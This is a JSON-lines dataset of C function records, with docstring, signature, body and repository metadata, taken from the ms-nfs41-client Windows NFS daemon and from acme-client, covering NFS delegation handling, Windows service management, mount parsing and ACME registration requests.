{"docstring": "/* find the first open that needs recovery */\n", "func_signal": "static nfs41_open_state* deleg_open_find(\n    IN struct client_state *state,\n    IN const nfs41_delegation_state *deleg)", "code": "{\n    struct list_entry *entry;\n    nfs41_open_state *open = NULL;\n\n    EnterCriticalSection(&state->lock);\n    entry = list_search(&state->opens, deleg, open_deleg_cmp);\n    if (entry) {\n        open = open_entry(entry);\n        nfs41_open_state_ref(open); /* return a reference */\n    }\n    LeaveCriticalSection(&state->lock);\n    return open;\n}", "path": "daemon\\delegation.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* allocation and reference counting */\n", "func_signal": "static int delegation_create(\n    IN const nfs41_path_fh *parent,\n    IN const nfs41_path_fh *file,\n    IN const open_delegation4 *delegation,\n    OUT nfs41_delegation_state **deleg_out)", "code": "{\n    nfs41_delegation_state *state;\n    int status = NO_ERROR;\n\n    state = calloc(1, sizeof(nfs41_delegation_state));\n    if (state == NULL) {\n        status = GetLastError();\n        goto out;\n    }\n\n    memcpy(&state->state, delegation, sizeof(open_delegation4));\n\n    abs_path_copy(&state->path, file->path);\n    path_fh_init(&state->file, &state->path);\n    fh_copy(&state->file.fh, &file->fh);\n    path_fh_init(&state->parent, &state->path);\n    last_component(state->path.path, state->file.name.name,\n        &state->parent.name);\n    fh_copy(&state->parent.fh, &parent->fh);\n\n    list_init(&state->client_entry);\n    state->status = DELEGATION_GRANTED;\n    InitializeSRWLock(&state->lock);\n    InitializeConditionVariable(&state->cond);\n    state->ref_count = 1;\n    *deleg_out = state;\nout:\n    return status;\n}", "path": "daemon\\delegation.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: ReportStatusToSCMgr()\n//\n//  PURPOSE: Sets the current status of the service and\n//           reports it to the Service Control Manager\n//\n//  PARAMETERS:\n//    dwCurrentState - the state of the service\n//    dwWin32ExitCode - error code to report\n//    dwWaitHint - worst case estimate to next checkpoint\n//\n//  RETURN VALUE:\n//    TRUE  - success\n//    FALSE - failure\n//\n//  COMMENTS:\n//\n", "func_signal": "BOOL ReportStatusToSCMgr(DWORD dwCurrentState,\n                         DWORD dwWin32ExitCode,\n                         DWORD dwWaitHint)", "code": "{\n   static DWORD dwCheckPoint = 1;\n   BOOL fResult = TRUE;\n\n\n   if ( !bDebug ) // when debugging we don't report to the SCM\n   {\n      if (dwCurrentState == SERVICE_START_PENDING)\n         ssStatus.dwControlsAccepted = 0;\n      else\n         ssStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;\n\n      ssStatus.dwCurrentState = dwCurrentState;\n      ssStatus.dwWin32ExitCode = dwWin32ExitCode;\n      ssStatus.dwWaitHint = dwWaitHint;\n\n      if ( ( dwCurrentState == SERVICE_RUNNING ) ||\n           ( dwCurrentState == SERVICE_STOPPED ) )\n         ssStatus.dwCheckPoint = 0;\n      else\n         ssStatus.dwCheckPoint = dwCheckPoint++;\n\n\n      // Report the status of the service to the service control manager.\n      fResult = SetServiceStatus(sshStatusHandle, &ssStatus);\n      if (!fResult)\n         AddToMessageLog(TEXT(\"SetServiceStatus\"));\n   }\n   return fResult;\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* assignment within conditional expression */\n", "func_signal": "static int delegation_return(\n    IN nfs41_client *client,\n    IN nfs41_delegation_state *deleg,\n    IN bool_t truncate,\n    IN bool_t try_recovery)", "code": "{\n    stateid_arg stateid;\n    nfs41_open_state *open;\n    int status;\n\n    if (deleg->srv_open) {\n        /* make an upcall to the kernel: invalide data cache */\n        HANDLE pipe;\n        unsigned char inbuf[sizeof(HANDLE)], *buffer = inbuf; \n        DWORD inbuf_len = sizeof(HANDLE), outbuf_len, dstatus;\n        uint32_t length;\n        dprintf(1, \"delegation_return: making a downcall for srv_open=%x\\n\", \n            deleg->srv_open);\n        pipe = CreateFile(NFS41_USER_DEVICE_NAME_A, GENERIC_READ|GENERIC_WRITE, \n                FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);\n        if (pipe == INVALID_HANDLE_VALUE) {\n            eprintf(\"delegation_return: Unable to open downcall pipe %d\\n\", \n                GetLastError());\n            goto out_downcall;\n        }\n        length = inbuf_len;\n        safe_write(&buffer, &length, &deleg->srv_open, sizeof(HANDLE));\n\n        dstatus = DeviceIoControl(pipe, IOCTL_NFS41_INVALCACHE, inbuf, inbuf_len,\n            NULL, 0, (LPDWORD)&outbuf_len, NULL);\n        if (!dstatus)\n            eprintf(\"IOCTL_NFS41_INVALCACHE failed %d\\n\", GetLastError());\n        CloseHandle(pipe);\n    }\nout_downcall:\n\n    /* recover opens and locks associated with the delegation */\n    while (open = deleg_open_find(&client->state, deleg)) {\n        status = nfs41_delegation_to_open(open, try_recovery);\n        if (status == NFS4_OK)\n            status = delegation_flush_locks(open, try_recovery);\n        nfs41_open_state_deref(open);\n\n        if (status)\n            break;\n    }\n\n    /* return the delegation */\n    stateid.type = STATEID_DELEG_FILE;\n    stateid.open = NULL;\n    stateid.delegation = deleg;\n    AcquireSRWLockShared(&deleg->lock);\n    memcpy(&stateid.stateid, &deleg->state.stateid, sizeof(stateid4));\n    ReleaseSRWLockShared(&deleg->lock);\n\n    status = nfs41_delegreturn(client->session,\n        &deleg->file, &stateid, try_recovery);\n    if (status == NFS4ERR_BADSESSION)\n        goto out;\n\n    delegation_remove(client, deleg);\nout:\n    return status;\n}", "path": "daemon\\delegation.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* NFS41_MOUNT */\n", "func_signal": "static int parse_mount(unsigned char *buffer, uint32_t length, nfs41_upcall *upcall)", "code": "{\n    int status;\n    mount_upcall_args *args = &upcall->args.mount;\n\n    status = get_name(&buffer, &length, &args->hostname);\n    if(status) goto out;\n    status = get_name(&buffer, &length, &args->path);\n    if(status) goto out;\n    status = safe_read(&buffer, &length, &args->sec_flavor, sizeof(DWORD));\n    if (status) goto out;\n    status = safe_read(&buffer, &length, &args->rsize, sizeof(DWORD));\n    if (status) goto out;\n    status = safe_read(&buffer, &length, &args->wsize, sizeof(DWORD));\n    if (status) goto out;\n\n    dprintf(1, \"parsing NFS14_MOUNT: srv_name=%s root=%s sec_flavor=%s \"\n        \"rsize=%d wsize=%d\\n\", args->hostname, args->path, \n        secflavorop2name(args->sec_flavor), args->rsize, args->wsize);\nout:\n    return status;\n}", "path": "daemon\\mount.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: CmdInstallService()\n//\n//  PURPOSE: Installs the service\n//\n//  PARAMETERS:\n//    none\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//\n", "func_signal": "void CmdInstallService()", "code": "{\n   SC_HANDLE   schService;\n   SC_HANDLE   schSCManager;\n\n   TCHAR szPath[512];\n\n   if ( GetModuleFileName( NULL, szPath, 512 ) == 0 )\n   {\n      _tprintf(TEXT(\"Unable to install %s - %s\\n\"), TEXT(SZSERVICEDISPLAYNAME), GetLastErrorText(szErr, 256));\n      return;\n   }\n\n   schSCManager = OpenSCManager(\n                               NULL,                   // machine (NULL == local)\n                               NULL,                   // database (NULL == default)\n                               SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE  // access required\n                               );\n   if ( schSCManager )\n   {\n      schService = CreateService(\n                                schSCManager,               // SCManager database\n                                TEXT(SZSERVICENAME),        // name of service\n                                TEXT(SZSERVICEDISPLAYNAME), // name to display\n                                SERVICE_QUERY_STATUS,       // desired access\n                                SERVICE_WIN32_OWN_PROCESS,  // service type\n                                SERVICE_AUTO_START,         // start type\n                                SERVICE_ERROR_NORMAL,       // error control type\n                                szPath,                     // service's binary\n                                NULL,                       // no load ordering group\n                                NULL,                       // no tag identifier\n                                TEXT(SZDEPENDENCIES),       // dependencies\n                                NULL,                       // LocalSystem account\n                                NULL);                      // no password\n\n      if ( schService )\n      {\n         _tprintf(TEXT(\"%s installed.\\n\"), TEXT(SZSERVICEDISPLAYNAME) );\n         CloseServiceHandle(schService);\n      }\n      else\n      {\n         _tprintf(TEXT(\"CreateService failed - %s\\n\"), GetLastErrorText(szErr, 256));\n      }\n\n      CloseServiceHandle(schSCManager);\n   }\n   else\n      _tprintf(TEXT(\"OpenSCManager failed - %s\\n\"), GetLastErrorText(szErr,256));\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* dprintf level for superblock logging */\n", "func_signal": "static __inline int compare_fsid(\n    IN const nfs41_fsid *lhs,\n    IN const nfs41_fsid *rhs)", "code": "{\n    if (lhs->major > rhs->major) return 1;\n    if (lhs->major < rhs->major) return -1;\n    if (lhs->minor > rhs->minor) return 1;\n    if (lhs->minor < rhs->minor) return -1;\n    return 0;\n}", "path": "daemon\\nfs41_superblock.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* NFS41_UNMOUNT */\n", "func_signal": "static int parse_unmount(unsigned char *buffer, uint32_t length, nfs41_upcall *upcall)", "code": "{\n    dprintf(1, \"parsing NFS41_UNMOUNT: root=%p\\n\", upcall->root_ref);\n    return ERROR_SUCCESS;\n}", "path": "daemon\\mount.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: CmdRemoveService()\n//\n//  PURPOSE: Stops and removes the service\n//\n//  PARAMETERS:\n//    none\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//\n", "func_signal": "void CmdRemoveService()", "code": "{\n   SC_HANDLE   schService;\n   SC_HANDLE   schSCManager;\n\n   schSCManager = OpenSCManager(\n                               NULL,                   // machine (NULL == local)\n                               NULL,                   // database (NULL == default)\n                               SC_MANAGER_CONNECT   // access required\n                               );\n   if ( schSCManager )\n   {\n      schService = OpenService(schSCManager, TEXT(SZSERVICENAME), DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);\n\n      if (schService)\n      {\n         // try to stop the service\n         if ( ControlService( schService, SERVICE_CONTROL_STOP, &ssStatus ) )\n         {\n            _tprintf(TEXT(\"Stopping %s.\"), TEXT(SZSERVICEDISPLAYNAME));\n            Sleep( 1000 );\n\n            while ( QueryServiceStatus( schService, &ssStatus ) )\n            {\n               if ( ssStatus.dwCurrentState == SERVICE_STOP_PENDING )\n               {\n                  _tprintf(TEXT(\".\"));\n                  Sleep( 1000 );\n               }\n               else\n                  break;\n            }\n\n            if ( ssStatus.dwCurrentState == SERVICE_STOPPED )\n               _tprintf(TEXT(\"\\n%s stopped.\\n\"), TEXT(SZSERVICEDISPLAYNAME) );\n            else\n               _tprintf(TEXT(\"\\n%s failed to stop.\\n\"), TEXT(SZSERVICEDISPLAYNAME) );\n\n         }\n\n         // now remove the service\n         if ( DeleteService(schService) )\n            _tprintf(TEXT(\"%s removed.\\n\"), TEXT(SZSERVICEDISPLAYNAME) );\n         else\n            _tprintf(TEXT(\"DeleteService failed - %s\\n\"), GetLastErrorText(szErr,256));\n\n\n         CloseServiceHandle(schService);\n      }\n      else\n         _tprintf(TEXT(\"OpenService failed - %s\\n\"), GetLastErrorText(szErr,256));\n\n      CloseServiceHandle(schSCManager);\n   }\n   else\n      _tprintf(TEXT(\"OpenSCManager failed - %s\\n\"), GetLastErrorText(szErr,256));\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: service_ctrl\n//\n//  PURPOSE: This function is called by the SCM whenever\n//           ControlService() is called on this service.\n//\n//  PARAMETERS:\n//    dwCtrlCode - type of control requested\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//\n", "func_signal": "VOID WINAPI service_ctrl(DWORD dwCtrlCode)", "code": "{\n   // Handle the requested control code.\n   //\n   switch (dwCtrlCode)\n   {\n   // Stop the service.\n   //\n   // SERVICE_STOP_PENDING should be reported before\n   // setting the Stop Event - hServerStopEvent - in\n   // ServiceStop().  This avoids a race condition\n   // which may result in a 1053 - The Service did not respond...\n   // error.\n   case SERVICE_CONTROL_STOP:\n      ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0);\n      ServiceStop();\n      return;\n\n      // Update the service status.\n      //\n   case SERVICE_CONTROL_INTERROGATE:\n      break;\n\n      // invalid control code\n      //\n   default:\n      break;\n\n   }\n\n   ReportStatusToSCMgr(ssStatus.dwCurrentState, NO_ERROR, 0);\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: AddToMessageLog(LPTSTR lpszMsg)\n//\n//  PURPOSE: Allows any thread to log an error message\n//\n//  PARAMETERS:\n//    lpszMsg - text for message\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//\n", "func_signal": "VOID AddToMessageLog(LPTSTR lpszMsg)", "code": "{\n   TCHAR szMsg [(sizeof(SZSERVICENAME) / sizeof(TCHAR)) + 100 ];\n   HANDLE  hEventSource;\n   LPTSTR  lpszStrings[2];\n\n   if ( !bDebug )\n   {\n      dwErr = GetLastError();\n\n      // Use event logging to log the error.\n      //\n      hEventSource = RegisterEventSource(NULL, TEXT(SZSERVICENAME));\n\n      _stprintf_s(szMsg,(sizeof(SZSERVICENAME) / sizeof(TCHAR)) + 100, TEXT(\"%s error: %d\"), TEXT(SZSERVICENAME), dwErr);\n      lpszStrings[0] = szMsg;\n      lpszStrings[1] = lpszMsg;\n\n      if (hEventSource != NULL)\n      {\n         ReportEvent(hEventSource, // handle of event source\n                     EVENTLOG_ERROR_TYPE,  // event type\n                     0,                    // event category\n                     0,                    // event ID\n                     NULL,                 // current user's SID\n                     2,                    // strings in lpszStrings\n                     0,                    // no bytes of raw data\n                     lpszStrings,          // array of error strings\n                     NULL);                // no raw data\n\n         (VOID) DeregisterEventSource(hEventSource);\n      }\n   }\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: ControlHandler ( DWORD dwCtrlType )\n//\n//  PURPOSE: Handled console control events\n//\n//  PARAMETERS:\n//    dwCtrlType - type of control event\n//\n//  RETURN VALUE:\n//    True - handled\n//    False - unhandled\n//\n//  COMMENTS:\n//\n", "func_signal": "BOOL WINAPI ControlHandler ( DWORD dwCtrlType )", "code": "{\n   switch ( dwCtrlType )\n   {\n   case CTRL_BREAK_EVENT:  // use Ctrl+C or Ctrl+Break to simulate\n   case CTRL_C_EVENT:      // SERVICE_CONTROL_STOP in debug mode\n      _tprintf(TEXT(\"Stopping %s.\\n\"), TEXT(SZSERVICEDISPLAYNAME));\n      ServiceStop();\n      return TRUE;\n      break;\n\n   }\n   return FALSE;\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* find the first lock that needs recovery */\n", "func_signal": "static bool_t deleg_lock_find(\n    IN nfs41_open_state *open,\n    OUT nfs41_lock_state *lock_out)", "code": "{\n    struct list_entry *entry;\n    bool_t found = FALSE;\n\n    AcquireSRWLockShared(&open->lock);\n    list_for_each(entry, &open->locks.list) {\n        nfs41_lock_state *lock = lock_entry(entry);\n        if (lock->delegated) {\n            /* copy offset, length, type */\n            lock_out->offset = lock->offset;\n            lock_out->length = lock->length;\n            lock_out->exclusive = lock->exclusive;\n            lock_out->id = lock->id;\n            found = TRUE;\n            break;\n        }\n    }\n    ReleaseSRWLockShared(&open->lock);\n    return found;\n}", "path": "daemon\\delegation.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: service_main\n//\n//  PURPOSE: To perform actual initialization of the service\n//\n//  PARAMETERS:\n//    dwArgc   - number of command line arguments\n//    lpszArgv - array of command line arguments\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//    This routine performs the service initialization and then calls\n//    the user defined ServiceStart() routine to perform majority\n//    of the work.\n//\n", "func_signal": "void WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv)", "code": "{\n\n   // register our service control handler:\n   //\n   sshStatusHandle = RegisterServiceCtrlHandler( TEXT(SZSERVICENAME), service_ctrl);\n\n   if (!sshStatusHandle)\n      goto cleanup;\n\n   // SERVICE_STATUS members that don't change in example\n   //\n   ssStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;\n   ssStatus.dwServiceSpecificExitCode = 0;\n\n\n   // report the status to the service control manager.\n   //\n   if (!ReportStatusToSCMgr(\n                           SERVICE_START_PENDING, // service state\n                           NO_ERROR,              // exit code\n                           3000))                 // wait hint\n      goto cleanup;\n\n\n   ServiceStart( dwArgc, lpszArgv );\n\n   cleanup:\n\n   // try to report the stopped status to the service control manager.\n   //\n   if (sshStatusHandle)\n      (VOID)ReportStatusToSCMgr(\n                               SERVICE_STOPPED,\n                               dwErr,\n                               0);\n\n   return;\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* nfs41_superblock */\n", "func_signal": "static int superblock_create(\n    IN const nfs41_fsid *fsid,\n    OUT nfs41_superblock **superblock_out)", "code": "{\n    int status = NO_ERROR;\n    nfs41_superblock *superblock;\n\n    dprintf(SBLVL, \"creating superblock for fsid(%llu,%llu)\\n\",\n        fsid->major, fsid->minor);\n\n    superblock = calloc(1, sizeof(nfs41_superblock));\n    if (superblock == NULL) {\n        status = GetLastError();\n        eprintf(\"failed to allocate superblock \"\n            \"for fsid(%llu,%llu)\\n\", fsid->major, fsid->minor);\n        goto out;\n    }\n\n    memcpy(&superblock->fsid, fsid, sizeof(nfs41_fsid));\n    InitializeSRWLock(&superblock->lock);\n\n    *superblock_out = superblock;\nout:\n    return status;\n}", "path": "daemon\\nfs41_superblock.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* assignment within conditional expression */\n", "func_signal": "void upcall_marshall(\n    IN nfs41_upcall *upcall,\n    OUT unsigned char *buffer,\n    IN uint32_t length,\n    OUT uint32_t *length_out)", "code": "{\n    const nfs41_upcall_op *op;\n    unsigned char *orig_buf = buffer;\n    const uint32_t total = length, orig_len = length;\n\n    /* marshall common elements */\nwrite_downcall:\n    length = orig_len;\n    buffer = orig_buf;\n    safe_write(&buffer, &length, &upcall->xid, sizeof(upcall->xid));\n    safe_write(&buffer, &length, &upcall->opcode, sizeof(upcall->opcode));\n    safe_write(&buffer, &length, &upcall->status, sizeof(upcall->status));\n    safe_write(&buffer, &length, &upcall->last_error, sizeof(upcall->last_error));\n\n    if (upcall->status)\n        goto out;\n\n    /* marshall the operation's results */\n    op = g_upcall_op_table[upcall->opcode];\n    if (op && op->marshall) {\n        if ((upcall->status = op->marshall(buffer, &length, upcall)))\n            goto write_downcall;\n    }\nout:\n    *length_out = total - length;\n}", "path": "daemon\\upcall.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: CmdDebugService(int argc, char ** argv)\n//\n//  PURPOSE: Runs the service as a console application\n//\n//  PARAMETERS:\n//    argc - number of command line arguments\n//    argv - array of command line arguments\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//\n", "func_signal": "void CmdDebugService(int argc, char ** argv)", "code": "{\n   DWORD dwArgc;\n   LPTSTR *lpszArgv;\n\n#ifdef UNICODE\n   lpszArgv = CommandLineToArgvW(GetCommandLineW(), &(dwArgc) );\n   if (NULL == lpszArgv)\n   {\n       // CommandLineToArvW failed!!\n       _tprintf(TEXT(\"CmdDebugService CommandLineToArgvW returned NULL\\n\"));\n       return;\n   }\n#else\n   dwArgc   = (DWORD) argc;\n   lpszArgv = argv;\n#endif\n\n   _tprintf(TEXT(\"Debugging %s.\\n\"), TEXT(SZSERVICEDISPLAYNAME));\n\n   SetConsoleCtrlHandler( ControlHandler, TRUE );\n\n   ServiceStart( dwArgc, lpszArgv );\n\n#ifdef UNICODE\n// Must free memory allocated for arguments\n\n   GlobalFree(lpszArgv);\n#endif // UNICODE\n\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: GetLastErrorText\n//\n//  PURPOSE: copies error message text to string\n//\n//  PARAMETERS:\n//    lpszBuf - destination buffer\n//    dwSize - size of buffer\n//\n//  RETURN VALUE:\n//    destination buffer\n//\n//  COMMENTS:\n//\n", "func_signal": "LPTSTR GetLastErrorText( LPTSTR lpszBuf, DWORD dwSize )", "code": "{\n   DWORD dwRet;\n   LPTSTR lpszTemp = NULL;\n\n   dwRet = FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |FORMAT_MESSAGE_ARGUMENT_ARRAY,\n                          NULL,\n                          GetLastError(),\n                          LANG_NEUTRAL,\n                          (LPTSTR)&lpszTemp,\n                          0,\n                          NULL );\n\n   // supplied buffer is not long enough\n   if ( !dwRet || ( (long)dwSize < (long)dwRet+14 ) )\n      lpszBuf[0] = TEXT('\\0');\n   else\n   {\n       if (NULL != lpszTemp)\n       {\n           lpszTemp[lstrlen(lpszTemp)-2] = TEXT('\\0');  //remove cr and newline character\n           _stprintf_s( lpszBuf, dwSize, TEXT(\"%s (0x%x)\"), lpszTemp, GetLastError() );\n       }\n   }\n\n   if ( NULL != lpszTemp )\n      LocalFree((HLOCAL) lpszTemp );\n\n   return lpszBuf;\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "//\n//  FUNCTION: main\n//\n//  PURPOSE: entrypoint for service\n//\n//  PARAMETERS:\n//    argc - number of command line arguments\n//    argv - array of command line arguments\n//\n//  RETURN VALUE:\n//    none\n//\n//  COMMENTS:\n//    main() either performs the command line task, or\n//    call StartServiceCtrlDispatcher to register the\n//    main service thread.  When the this call returns,\n//    the service has stopped, so exit.\n//\n", "func_signal": "void __cdecl main(int argc, char **argv)", "code": "{\n   SERVICE_TABLE_ENTRY dispatchTable[] =\n   {\n      { TEXT(SZSERVICENAME), (LPSERVICE_MAIN_FUNCTION)service_main},\n      { NULL, NULL}\n   };\n\n   if ( (argc > 1) &&\n        ((*argv[1] == '-') || (*argv[1] == '/')) )\n   {\n      if ( _stricmp( \"install\", argv[1]+1 ) == 0 )\n      {\n         CmdInstallService();\n      }\n      else if ( _stricmp( \"remove\", argv[1]+1 ) == 0 )\n      {\n         CmdRemoveService();\n      }\n      else if ( _stricmp( \"debug\", argv[1]+1 ) == 0 )\n      {\n         bDebug = TRUE;\n         CmdDebugService(argc, argv);\n      }\n      else\n      {\n         goto dispatch;\n      }\n      exit(0);\n   }\n\n   // if it doesn't match any of the above parameters\n   // the service control manager may be starting the service\n   // so we must call StartServiceCtrlDispatcher\n   dispatch:\n   // this is just to be friendly\n   printf( \"%s -install          to install the service\\n\", SZAPPNAME );\n   printf( \"%s -remove           to remove the service\\n\", SZAPPNAME );\n   printf( \"%s -debug <params>   to run as a console app for debugging\\n\", SZAPPNAME );\n   printf( \"\\nStartServiceCtrlDispatcher being called.\\n\" );\n   printf( \"This may take several seconds.  Please wait.\\n\" );\n\n   if (!StartServiceCtrlDispatcher(dispatchTable))\n      AddToMessageLog(TEXT(\"StartServiceCtrlDispatcher failed.\"));\n}", "path": "daemon\\service.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/* open delegation */\n", "func_signal": "int nfs41_delegation_granted(\n    IN nfs41_session *session,\n    IN nfs41_path_fh *parent,\n    IN nfs41_path_fh *file,\n    IN open_delegation4 *delegation,\n    IN bool_t try_recovery,\n    OUT nfs41_delegation_state **deleg_out)", "code": "{\n    stateid_arg stateid;\n    nfs41_client *client = session->client;\n    nfs41_delegation_state *state;\n    int status = NO_ERROR;\n\n    if (delegation->type != OPEN_DELEGATE_READ &&\n        delegation->type != OPEN_DELEGATE_WRITE)\n        goto out;\n\n    if (delegation->recalled) {\n        status = NFS4ERR_DELEG_REVOKED;\n        goto out_return;\n    }\n\n    /* allocate the delegation state */\n    status = delegation_create(parent, file, delegation, &state);\n    if (status)\n        goto out_return;\n\n    /* register the delegation with the client */\n    EnterCriticalSection(&client->state.lock);\n    /* XXX: check for duplicates by fh and stateid? */\n    list_add_tail(&client->state.delegations, &state->client_entry);\n    LeaveCriticalSection(&client->state.lock);\n\n    nfs41_delegation_ref(state); /* return a reference */\n    *deleg_out = state;\nout:\n    return status;\n\nout_return: /* return the delegation on failure */\n    memcpy(&stateid.stateid, &delegation->stateid, sizeof(stateid4));\n    stateid.type = STATEID_DELEG_FILE;\n    stateid.open = NULL;\n    stateid.delegation = NULL;\n    nfs41_delegreturn(session, file, &stateid, try_recovery);\n    goto out;\n}", "path": "daemon\\delegation.c", "repo_name": "cbodley/ms-nfs41-client", "stars": 136, "license": "lgpl-3.0", "language": "c", "size": 1576}
{"docstring": "/*\n * Send to the CA that we want to authorise a new account.\n * This only happens once for a new account key.\n * Returns non-zero on success.\n */\n", "func_signal": "static int\ndonewreg(struct conn *c, const char *agreement,\n\tconst struct capaths *p)", "code": "{\n\tint\t\t rc = 0;\n\tchar\t\t*req;\n\tlong\t\t lc;\n\n\tdodbg(\"%s: new-reg\", p->newreg);\n\n\tif (NULL == (req = json_fmt_newreg(agreement)))\n\t\twarnx(\"json_fmt_newreg\");\n\telse if ((lc = sreq(c, p->newreg, req)) < 0)\n\t\twarnx(\"%s: bad comm\", p->newreg);\n\telse if (200 != lc && 201 != lc)\n\t\twarnx(\"%s: bad HTTP: %ld\", p->newreg, lc);\n\telse if (NULL == c->buf.buf || 0 == c->buf.sz)\n\t\twarnx(\"%s: empty response\", p->newreg);\n\telse\n\t\trc = 1;\n\n\tif (0 == rc || verbose > 1)\n\t\tbuf_dump(&c->buf);\n\tfree(req);\n\treturn (rc);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Wrap around asprintf(3), which sometimes nullifies the input values,\n * sometimes not, but always returns <0 on error.\n * Returns NULL on failure or the pointer on success.\n */\n", "func_signal": "char *\ndoasprintf(const char *fmt, ...)", "code": "{\n\tint\t c;\n\tchar\t*cp;\n\tva_list\t ap;\n\n\tva_start(ap, fmt);\n\tc = vasprintf(&cp, fmt, ap);\n\tva_end(ap);\n\treturn(c < 0 ? NULL : cp);\n}", "path": "util.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
{"docstring": "/*\n * Check with the CA whether a challenge has been processed.\n * Note: we'll only do this a limited number of times, and pause for a\n * time between checks, but this happens in the caller.\n */\n", "func_signal": "static int\ndochngcheck(struct conn *c, struct chng *chng)", "code": "{\n\tint\t\t cc;\n\tlong\t\t lc;\n\tstruct jsmnn\t*j;\n\n\tdodbg(\"%s: status\", chng->uri);\n\n\tif ((lc = nreq(c, chng->uri)) < 0) {\n\t\twarnx(\"%s: bad comm\", chng->uri);\n\t\treturn (0);\n\t} else if (200 != lc && 201 != lc && 202 != lc) {\n\t\twarnx(\"%s: bad HTTP: %ld\", chng->uri, lc);\n\t\tbuf_dump(&c->buf);\n\t\treturn (0);\n\t} else if (NULL == (j = json_parse(c->buf.buf, c->buf.sz))) {\n\t\twarnx(\"%s: bad JSON object\", chng->uri);\n\t\tbuf_dump(&c->buf);\n\t\treturn (0);\n\t} else if (-1 == (cc = json_parse_response(j))) {\n\t\twarnx(\"%s: bad response\", chng->uri);\n\t\tbuf_dump(&c->buf);\n\t\tjson_free(j);\n\t\treturn (0);\n\t} else if (cc > 0)\n\t\tchng->status = 1;\n\n\tjson_free(j);\n\treturn (1);\n}", "path": "netproc.c", "repo_name": "kristapsdz/acme-client", "stars": 176, "license": "isc", "language": "c", "size": 433}
